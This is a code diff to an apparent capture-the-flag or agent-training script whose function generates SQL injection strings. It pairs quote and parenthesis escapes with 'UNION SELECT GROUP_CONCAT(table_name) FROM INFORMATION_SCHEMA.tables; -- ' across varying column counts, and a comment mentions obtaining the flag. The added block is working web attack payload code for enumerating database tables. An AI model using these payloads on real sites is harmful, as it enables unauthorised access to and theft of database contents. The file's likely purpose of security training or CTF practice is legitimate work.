@@ -7,8 +7,8 @@ def add_escape(instr, escape):
 def generate_actions(escapes = None, max_columns = 5):
     actions = []
     if(escapes is None):
-        # escapes = ["'", "')", '"', '")']
-        escapes = ["'", "')", '"', '")', "", ")"]
+        escapes = ["'", "')", '"', '")']
+        # escapes = ["'", "')", '"', '")', "", ")"]
 
 
     for esc in escapes:
@@ -24,6 +24,17 @@ def generate_actions(escapes = None, max_columns = 5):
             actions.append(x)
 
             columns = columns + "," + str(i)
+
+        columns = "1"
+        for i in range(1,max_columns+2):
+            if i != max_columns+1:
+                if i == 1:
+                    x = ("0" if esc == "" or esc == ")" else "") + "{0} UNION SELECT GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.tables; -- ".format(esc)
+                else:
+                    x = ("0" if esc == "" or esc == ")" else "") + "{0} UNION SELECT GROUP_CONCAT(table_name), {1} FROM INFORMATION_SCHEMA.tables; -- ".format(esc, columns)
+                    columns = columns + "," + str(i)
+                actions.append(x)
+
 
         #To obtain the flag
         # columns = "flag"
